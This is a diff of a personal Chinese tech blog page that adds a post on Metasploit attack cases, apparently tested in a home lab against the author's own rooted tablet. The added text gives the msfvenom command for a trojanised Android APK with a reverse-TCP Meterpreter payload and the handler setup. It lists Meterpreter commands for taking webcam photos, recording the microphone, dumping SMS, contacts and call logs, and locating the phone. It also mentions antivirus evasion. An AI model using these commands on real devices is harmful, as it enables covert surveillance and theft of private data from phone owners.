@@ -4,12 +4,13 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="阿里云Ubuntu 18.04搭建nextcloud私有网盘, sql c java 软件工程 火花 冰蓝色火花 楽楽 linux termux macos">
+    <meta name="keywords" content="msf复现案例, sql c java 软件工程 火花 冰蓝色火花 楽楽 linux termux macos">
     <meta name="baidu-site-verification" content="XGOMoOZrlG">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
-    <meta name="description" content="awdawdawdawdawdawd
-">
+    <meta name="description" content="安卓渗透环境:Mac OS Mojave10.14.6(192.168.0.102): msfMIPAD4(192.168.0.*): 已root
+生成带有木马的apk文件打开 msfconsole 输入：
+msfvenom -p andr">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +18,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>阿里云Ubuntu 18.04搭建nextcloud私有网盘 | 火花</title>
+    <title>msf复现案例 | 火花</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -321,13 +322,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/特征图/乌班图.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/特征图/iterm2.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        阿里云Ubuntu 18.04搭建nextcloud私有网盘
+                        msf复现案例
                     </div>
                 </div>
             </div>
@@ -446,7 +447,11 @@
                 <div class="col s7">
                     
                     <div class="article-tag">
-                        <span class="chip bg-color">无标签</span>
+                        
+                        <a href="/tags/折腾/" target="_blank">
+                            <span class="chip bg-color">折腾</span>
+                        </a>
+                        
                     </div>
                     
                 </div>
@@ -458,7 +463,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-09-25
+                    2020-11-26
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -472,14 +477,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1
+                    887
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    4 分
                 </div>
                 
                 
@@ -495,7 +500,106 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>awdawdawd<br>aw<br>daw<br>d<br>awd</p>
+                <h1 id="安卓渗透"><a href="#安卓渗透" class="headerlink" title="安卓渗透"></a>安卓渗透</h1><p>环境:<br>Mac OS Mojave10.14.6(192.168.0.102): msf<br>MIPAD4(192.168.0.*): 已root</p>
+<h2 id="生成带有木马的apk文件"><a href="#生成带有木马的apk文件" class="headerlink" title="生成带有木马的apk文件"></a>生成带有木马的apk文件</h2><p>打开 <strong>msfconsole</strong> 输入：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p android/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>X LPORT<span class="token operator">=</span>4444 R <span class="token operator">></span> Y/text.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/medias/msf/%E6%9C%A8%E9%A9%AC.png" alt></p>
+<blockquote>
+<p>其中X为主机IP(192.168.0.102)，Y为生成木马app的路径<br>LHOST 设置用来接收反弹连接的主机IP(192.168.0.102)<br>LPORT 设置用来接收反弹连接的kali端口(4444)</p>
+</blockquote>
+<p><img src="/medias/msf/app.png" alt><br>此处生成的app会被安卓系统的安全软件报毒，通过搜索使用免杀姿势可以解决。</p>
+<h2 id="连接木马"><a href="#连接木马" class="headerlink" title="连接木马"></a>连接木马</h2><blockquote>
+<p>此处需要对应的安卓系统和主机连接同一个局域网并且root<br>打开 <strong>msfconsole</strong> 再次输入:</p>
+</blockquote>
+<pre class="line-numbers language-bash"><code class="language-bash">use exploit/multi/handler
+<span class="token keyword">set</span> PAYLOAD android/meterpreter/reverse_tcp
+<span class="token keyword">set</span> LHOST 192.168.0.102
+<span class="token keyword">set</span> LPORT 4444
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>等安卓系统安装完应用并打开:<br><img src="/medias/msf/%E6%88%90%E5%8A%9F.png" alt></p>
+<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>cd –&gt;目录切换，命令：cd / 切换到根目录<br>search –&gt;搜索文件，命令：search text.jpg<br>download –&gt;下载文件，命令：download test.jpg<br>webcam_list –&gt;查看摄像头列表，因为手机都是前置和后置摄像头了<br>webcam_snap –&gt;拍照一张，需要选用前置或者后置摄像头，命令：webcam_snap -i 1<br>webcam_stream –&gt;开启摄像头视频监控，同上，命令：webcam_stream -i<br>查看当前安卓是否已经root: check_root<br>下载通话记录: dump_calllog<br>下载短信记录: dump_contacts<br>下载通讯录: dump_sms<br>geolocate –&gt;利用谷歌地图定位（需要安装谷歌地图）</p>
+<h2 id="核心命令："><a href="#核心命令：" class="headerlink" title="核心命令："></a>核心命令：</h2><p>============================</p>
+<pre><code>Command      Description
+-------      -----------
+background          # Backgrounds the current session
+bgkill              # Kills a background meterpreter script
+bglist              # Lists running background scripts
+bgrun               # Executes a meterpreter script as a background thread
+channel             # Displays information or control active channels
+close               # Closes a channel
+disable_unicode_encoding  # Disables encoding of unicode strings
+enable_unicode_encoding   # Enables encoding of unicode strings
+exit                 # Terminate the meterpreter session
+get_timeouts        #  Get the current session timeout values
+help                #  Help menu
+info                # Displays information about a Post module
+irb                   Drop into irb scripting mode
+load                  Load one or more meterpreter extensions
+machine_id              Get the MSF ID of the machine attached to the session
+quit                  Terminate the meterpreter session
+read                  Reads data from a channel
+resource                Run the commands stored in a file
+run                   Executes a meterpreter script or Post module
+sess                  Quickly switch to another session
+set_timeouts            Set the current session timeout values
+sleep                  Force Meterpreter to go quiet, then re-establish session.
+transport               Change the current transport mechanism
+use                   Deprecated alias for &#39;load&#39;
+uuid                  Get the UUID for the current session
+write                  Writes data to a channel</code></pre><h2 id="Stdapi-File-system-Commands"><a href="#Stdapi-File-system-Commands" class="headerlink" title="Stdapi: File system Commands"></a>Stdapi: File system Commands</h2><p>============================</p>
+<pre><code>Command      Description
+-------      -----------
+cat         Read the contents of a file to the screen
+cd          Change directory
+checksum      Retrieve the checksum of a file
+dir         List files (alias for ls)
+download      Download a file or directory
+edit        Edit a file
+getlwd       Print local working directory
+getwd        Print working directory
+lcd         Change local working directory
+lpwd        Print local working directory
+ls          List files
+mkdir        Make directory
+pwd         Print working directory
+rm          Delete the specified file
+rmdir        Remove directory
+search       Search for files
+upload       Upload a file or directory</code></pre><h2 id="Stdapi-Networking-Commands"><a href="#Stdapi-Networking-Commands" class="headerlink" title="Stdapi: Networking Commands"></a>Stdapi: Networking Commands</h2><p>===========================</p>
+<pre><code>Command      Description
+-------      -----------
+ifconfig      Display interfaces
+ipconfig      Display interfaces
+portfwd       Forward a local port to a remote service
+route        View and modify the routing table</code></pre><h2 id="Stdapi-System-Commands"><a href="#Stdapi-System-Commands" class="headerlink" title="Stdapi: System Commands"></a>Stdapi: System Commands</h2><p>=======================</p>
+<pre><code>Command      Description
+-------      -----------
+execute       Execute a command
+getuid       Get the user that the server is running as
+localtime     Displays the target system&#39;s local date and time
+ps          List running processes
+shell        Drop into a system command shell
+sysinfo       Gets information about the remote system, such as OS</code></pre><h2 id="Stdapi-Webcam-Commands"><a href="#Stdapi-Webcam-Commands" class="headerlink" title="Stdapi: Webcam Commands"></a>Stdapi: Webcam Commands</h2><p>=======================</p>
+<pre><code>Command       Description
+-------       -----------
+record_mic     Record audio from the default microphone for X seconds           打开麦克风录音
+webcam_chat    Start a video chat
+webcam_list    List webcams                                                                      显示有多少个摄像头
+webcam_snap    Take a snapshot from the specified webcam                          拍照
+webcam_stream  Play a video stream from the specified webcam</code></pre><h2 id="Android-Commands"><a href="#Android-Commands" class="headerlink" title="Android Commands"></a>Android Commands</h2><p>================</p>
+<pre><code>Command          Description
+-------          -----------
+activity_start    Start an Android activity from a Uri string                            打开某个网址的安卓程序
+check_root       Check if device is rooted                                                  查看是否ROOT
+dump_calllog      Get call log                                                                  取得通话记录
+dump_contacts     Get contacts list                                                          取得通信录
+dump_sms         Get sms messages                                                         取得短信记录
+geolocate        Get current lat-long using geolocation                                取得地理位置信息
+interval_collect  Manage interval collection capabilities
+send_sms         Sends SMS from target session                                          发送短信（实验不成功）
+set_audio_mode    Set Ringer Mode                                                         调整铃声大小
+sqlite_query      Query a SQLite database from storage
+wlan_geolocate    Get current lat-long using WLAN information</code></pre><h1 id="windows渗透"><a href="#windows渗透" class="headerlink" title="windows渗透"></a>windows渗透</h1><h2 id="永恒之蓝ms17-010"><a href="#永恒之蓝ms17-010" class="headerlink" title="永恒之蓝ms17-010"></a>永恒之蓝ms17-010</h2><h2 id="officeCVE-2017-11882"><a href="#officeCVE-2017-11882" class="headerlink" title="officeCVE-2017-11882"></a>officeCVE-2017-11882</h2><p><a href="https://www.sqlsec.com/2020/10/office.html" target="_blank" rel="noopener">参考国光</a></p>
 
             </div>
             <hr />
@@ -654,9 +758,9 @@
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《阿里云Ubuntu 18.04搭建nextcloud私有网盘》
+                    《msf复现案例》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/09/25/a-li-yun-ubuntu-18-04-da-jian-nextcloud-si-you-wang-pan/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/11/26/msf-fu-xian-an-li/" property="cc:attributionName"
                rel="cc:attributionURL">
                 火花
             </a> 采用
@@ -958,33 +1062,35 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/11/01/sqli-labs-ba-chang-bu-shu-mac/">
+                <a href="/2020/11/26/msf-fu-xian-an-li/">
                     <div class="card-image">
                         
-                        <img src="/medias/特征图/sqli.png" class="responsive-img" alt="sqli-labs靶场部署（MAC）">
+                        <img src="/medias/特征图/iterm2.jpg" class="responsive-img" alt="msf复现案例">
                         
-                        <span class="card-title">sqli-labs靶场部署（MAC）</span>
+                        <span class="card-title">msf复现案例</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            记录一次mac上sqli靶场搭建（PHP7）
+                            总结几次msf框架下的攻击案例
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-01
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-26
+                            </span>
                         <span class="publish-author">
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1003,30 +1109,30 @@
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/06/15/aircrack-ng-zhua-bao-po-jie-wi-fi-wpa2/">
+                <a href="/2020/11/18/javaweb-jndi-fen-ceng/">
                     <div class="card-image">
                         
-                        <img src="/medias/特征图/aircrack-ng.gif" class="responsive-img" alt="Aircrack-ng抓包破解Wi-Fi(WPA2)">
+                        <img src="/medias/JDBC/JDBC.jpeg" class="responsive-img" alt="JavaWeb-JNDI分层">
                         
-                        <span class="card-title">Aircrack-ng抓包破解Wi-Fi(WPA2)</span>
+                        <span class="card-title">JavaWeb-JNDI分层</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            暴力破解WPA2
+                            转载自java老师所给笔记
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-06-15
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-18
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/折腾/" class="post-category" target="_blank">
-                                    折腾
+                            <a href="/categories/笔记/" class="post-category" target="_blank">
+                                    笔记
                                 </a>
                             
                             
@@ -1036,8 +1142,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/aircrack-ng/" target="_blank">
-                        <span class="chip bg-color">aircrack-ng</span>
+                    <a href="/tags/java/" target="_blank">
+                        <span class="chip bg-color">java</span>
                     </a>
                     
                 </div>
